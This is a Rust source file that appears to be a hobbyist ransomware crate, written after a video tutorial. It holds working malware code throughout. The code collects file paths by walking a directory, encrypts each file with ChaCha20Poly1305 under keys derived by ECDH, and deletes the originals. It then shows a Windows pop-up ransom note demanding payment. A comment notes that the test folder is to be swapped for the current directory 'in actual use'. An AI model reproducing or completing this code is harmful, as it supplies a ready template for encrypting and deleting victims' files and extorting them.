//my own crypto crate
//created 09/26/2024
extern crate winapi;

use winapi::um::winuser::{MessageBoxW, MB_OK};
use std::ptr::null_mut;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

/* all imports from Mullin video on Rust Ransomware */
use chacha20::Key;
use p256::ecdh::diffie_hellman;
use p256::elliptic_curve::zeroize::Zeroize;
use p256::pkcs8::DecodePrivateKey;
use p256::pkcs8::DecodePublicKey;
use p256::pkcs8::EncodePrivateKey;
use p256::pkcs8::EncodePublicKey;
use p256::PublicKey;
use p256::SecretKey as PrivateKey;
use std::fs::{remove_file, File};
use std::io::Write;
use std::io::{stdout, BufReader, BufWriter, Read};
use walkdir;
use chacha20::Nonce;
use chacha20poly1305::aead::Aead;
use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
use rand_chacha::rand_core::SeedableRng;
use rand_chacha::ChaChaRng;
use rand::RngCore;
use hkdf::Hkdf;


//Buffer size that needs to be read from a file
const BUF_SIZE: usize = 32;
const AEAD_SIZE: usize = BUF_SIZE + 16;
pub fn read_exact_or_eof<R: Read + ?Sized>(this: &mut R, mut buf: &mut [u8], ) -> Result<usize, std::io::Error> {
    let mut size: usize = 0;

    while !buf.is_empty() {
        match this.read(buf) {
            Ok(0) => break,
            Ok(n) => {
                let temp = buf;
                buf = &mut temp[n..];
                size += n;
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => {}
            Err(e) => return Err(e),
        }
    }
    Ok(size)
}
pub fn get_randomizer(seed: Option<[u8; 32]>) -> ChaChaRng {
    if let Some(seed) = seed {
        ChaChaRng::from_seed(seed)
    } else {
        ChaChaRng::from_entropy()
    }
}
pub fn get_keypair(seed: Option<[u8; 32]>) -> (PrivateKey, PublicKey) {
    let mut rng = get_randomizer(seed);

    let private_key = PrivateKey::random(&mut rng);
    let public_key = private_key.public_key();

    (private_key, public_key)
}
pub fn import_asym_keys(priv_file: &str, pub_file: &str) -> (PrivateKey, PublicKey) {

    let public_key = PublicKey::read_public_key_pem_file(pub_file).unwrap();
    let private_key = PrivateKey::read_pkcs8_pem_file(priv_file).unwrap();

    (private_key, public_key)
}
pub fn dump_asym_keys(priv_key: &PrivateKey, pub_key: &PublicKey, out: Option<&str>) {
    let priv_pem = priv_key.to_pkcs8_pem(Default::default()).unwrap();
    let pub_pem = pub_key.to_public_key_pem(Default::default()).unwrap();

    let (mut priv_writer, mut pub_writer) = match out {
        Some(name) => {
            let mut priv_file = name.to_string();
            priv_file.push_str(".priv");
            let mut pub_file = name.to_string();
            pub_file.push_str(".pub");
            (
                Box::new(File::create(&priv_file).unwrap()) as Box<dyn Write>,
                Box::new(File::create(&pub_file).unwrap()) as Box<dyn Write>,
            )
        }
        None => (
            Box::new(stdout()) as Box<dyn Write>,
            Box::new(stdout()) as Box<dyn Write>,
        ),
    };
    priv_writer.write_all(priv_pem.as_bytes()).unwrap();
    pub_writer.write_all(pub_pem.as_bytes()).unwrap();
}
pub fn get_symmetric_key(priv_key: &PrivateKey, pub_key: &PublicKey) -> Key {
    let salt = b"Version 1";
    let info = b"this is a filler to expand key";
    let shared_secret = diffie_hellman(priv_key.to_nonzero_scalar(), pub_key.as_affine());
    let hkdf = shared_secret.extract::<sha2::Sha256>(Some(salt));
    let mut key: [u8; 32] = [0; 32];
    hkdf.expand(info, &mut key).unwrap();

    let rc = Key::clone_from_slice(&key);
    key.zeroize();

    rc
}
pub fn get_random_key(seed: Option<[u8;32]>) -> Key{
    use byteorder::{NativeEndian, WriteBytesExt};
    let salt = b"Version 1";
    let mut rng = get_randomizer(seed);

    let mut key = Vec::with_capacity(32);
    for _ in 0..4{
        key.write_u64::<NativeEndian>(rng.next_u64()).unwrap();
    }

    let mut hkey:[u8;32] = [0;32];

    let hk = Hkdf::<sha2::Sha256>::new(Some(salt), &key);
    hk.expand(&[], &mut hkey).unwrap();

    Key::clone_from_slice(&hkey)
}
pub fn enc_file(plain_file_path: &str, enc_file_name: &str, key: &Key, nonce: &Nonce) {
    let file = File::open(plain_file_path).unwrap();
    let mut reader = BufReader::new(file);

    let enc_file = File::create(enc_file_name).unwrap();
    let mut writer = BufWriter::new(enc_file);

    //holds data from the reader, so it can be later changed and written
    let mut data: [u8; BUF_SIZE] = [0; BUF_SIZE];

    let cipher = ChaCha20Poly1305::new(key);

    while let Ok(size) = read_exact_or_eof(&mut reader, &mut data) {
        if size == 0 {
            break;
        }

        let cipher_text = cipher.encrypt(nonce, data[..size].as_ref()).unwrap();
        writer.write_all(&cipher_text).unwrap()
    }
}
pub fn dec_file(enc_file: &str, dec_file: &str, key: &Key, nonce: &Nonce) {
    let file = File::open(enc_file).unwrap();
    let mut reader = BufReader::new(file);

    let dec_file = File::create(dec_file).unwrap();
    let mut writer = BufWriter::new(dec_file);

    //holds data from the reader, so it can be later changed and written
    let mut data: [u8; AEAD_SIZE] = [0; AEAD_SIZE];

    let decryptor = ChaCha20Poly1305::new(key);

    while let Ok(size) = read_exact_or_eof(&mut reader, &mut data) {
        if size == 0 {
            break;
        }

        match decryptor.decrypt(nonce, data[..size].as_ref()) {
            Ok(text) => writer.write_all(&text).unwrap(),
            Err(e) => eprintln!("Error: {}", e),
        }
    }
}
pub fn enc_files(files_to_encrypt: &Vec<String>, key: &Key, mut nonce: &mut Nonce) -> Vec<String>{
    let mut enc_file_names = Vec::new();

    for file in files_to_encrypt{
        let mut file_enc = file.clone();
        file_enc.push_str(".enc");
        enc_file(&file, &file_enc, &key, &nonce);
        enc_file_names.push(file_enc);
        inc_nonce(&mut nonce);
    }

    enc_file_names
}
pub fn dec_files(files_to_decrypt: &Vec<String>, original_file_names: &Vec<String>, key: &Key,
                 mut nonce: &mut Nonce) {
    for (file_enc, file_org) in files_to_decrypt.iter().zip(original_file_names.iter()){
        dec_file(&file_enc, &file_org, &key, &nonce);
        inc_nonce(&mut nonce);
    }
}
pub fn get_file_list() -> Vec<String>{
    let mut file_list = Vec::new();

    //remember to change this directory when in actual use it will default to the current directory
    for entry in walkdir::WalkDir::new("C:\\Users\\sebas\\OneDrive\\Desktop\\test")
        .into_iter()
        .filter_map(|e| e.ok())
    {
        let file_path = entry.path().to_string_lossy().to_string();

        if entry.file_type().is_file() && !file_path.contains("enc") && !file_path.contains
        ("ransom"){
            file_list.push(file_path);
        }
    }

    file_list
}
pub fn delete_files(files: &Vec<String>) -> std::io::Result<()>{
    for file in files {
        remove_file(file)?;
    }

    Ok(())
}
pub fn inc_nonce(nonce: &mut Nonce) {
    for byte in nonce.iter_mut() {
        if *byte < 255 {
            *byte += 1;
            return;
        }
        *byte = 0;
    }
}

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}
pub fn print_ransom_message(){
    let caption = to_wide("You have been Hacked!");
    let text = to_wide(
        "I have encrypted all of your valuable files. Please pay 200 elon musk \
    tokens to example@gmail.com with the ransom.pub file included as it is needed for decryption.\
     Do not restart your computer make sure it stays on or else your data will be gone.\
            -Hackerman102");

    unsafe {
        MessageBoxW(null_mut(), text.as_ptr(), caption.as_ptr(), MB_OK);
    }
}
/*
pub fn enc_dec_text_demo() {
    let args = Args::parse();

    let (priv1, pub1) = get_keypair(None);
    dump_asym_keys(&priv1, &pub1, None);
    println!();

    let (priv2, pub2) = get_keypair(None);
    dump_asym_keys(&priv2, &pub2, None);
    println!();

    this is the shared secret example:
    let enc_key = get_symmetric_key(&priv1, &pub2);
    let dec_key = get_symmetric_key(&priv2, &pub1)
    assert_eq!(enc_key, dec_key);

    println!("enc_key = {:?}\n", enc_key);
    println!("dec_key = {:?}\n", dec_key);

    let nonce = Nonce::default();

    let text = args.text;

    let cipher = ChaCha20Poly1305::new(&enc_key);
    let cipher_text = cipher.encrypt(&nonce, text.as_bytes()).unwrap();

    let decryptor = ChaCha20Poly1305::new(&dec_key);
    let plain_text = decryptor.decrypt(&nonce, cipher_text.as_ref()).unwrap();
    let plain_text = std::str::from_utf8(&plain_text).unwrap();

    println!("encrypted text = {:x?}", cipher_text);
    println!("decrypted text = {}", plain_text);
}

pub fn enc_dec_file_demo() {
    //parse the cmd args
    let args = Args::parse();
    let original_file = args.file;
    let enc_filename = args.enc_file;
    let dec_filename = args.dec_file;

    //create the nonce
    let nonce = Nonce::default();

    //Generate the keys
    let (priv1, pub1) = get_keypair(None);
    let (priv2, pub2) = get_keypair(None);

    let enc_key = get_symmetric_key(&priv1, &pub2);
    let dec_key = get_symmetric_key(&priv2, &pub1);
    assert_eq!(enc_key, dec_key);

    //Encrypt then Decrypt the files
    enc_file(&original_file, &enc_filename, &enc_key, &nonce);
    dec_file(&enc_filename, &dec_filename, &dec_key, &nonce);
}

pub fn enc_dec_directory_demo() {
    //Perform setup like creating the Keys, Nonce, File List
    let file_list = get_file_list();

    //create the nonce
    let nonce = Nonce::default();

    //Generate the keys
    let (priv1, pub1) = get_keypair(None);
    let (priv2, pub2) = get_keypair(None);

    let enc_key = get_symmetric_key(&priv1, &pub2);
    let dec_key = get_symmetric_key(&priv2, &pub1);
    assert_eq!(enc_key, dec_key);

    let enc_filenames = enc_files(&file_list, &enc_key, &nonce);

    delete_org_files(&file_list).expect("Failed to properly delete the files");

    dec_files(&enc_filenames, &file_list, &dec_key, &nonce);
}
*/

